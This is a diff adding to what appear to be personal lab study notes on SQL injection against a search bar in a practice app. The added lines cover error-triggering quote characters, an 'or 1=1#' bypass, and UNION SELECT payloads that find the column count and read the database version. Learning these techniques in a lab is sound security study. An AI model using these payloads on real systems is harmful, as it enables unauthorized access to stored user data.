@@ -1748,5 +1748,32 @@ Our lab uses this -->  users table:
 we'll find a simply search bar:
 if we write for example -->  jeremy => it will return the email
 ![[Pasted image 20240307111601.png]]
+[[cheet#SQL Injection]]
+##### Basic trigger and operators
+- try to use characters that might trigger an error:
+  `jeremy'`
+  `jeremy"`
+  `'`
+  `"`
+- `jeremy' or 1=1#`
+  `or 1=1` -->  returns always true
+  `#` -->  end sql queries                      (for mysql you can also use `-- -`)
+        => everything after this -->  will be ignored
+    ![[Pasted image 20240307112811.png]]
+    this in an indication that the app -->  is vulnerable to SQL injection
 
+##### Union
+we can use it to selects other information or info from another table
+>[!warning] Constraint
+>There is a constraint to use UNION:
+> we can only select -->  the same n° of columns as in the original query
 
+=>
+`jeremy' union select null#`
+`jeremy' union select null,null#`
+`jeremy' union select null,null,null#`
+![[Pasted image 20240307113504.png]]
+we find something
+=>
+`jeremy' union select null,null,version()#` -->  to read the db version
+![[Pasted image 20240307113541.png]]
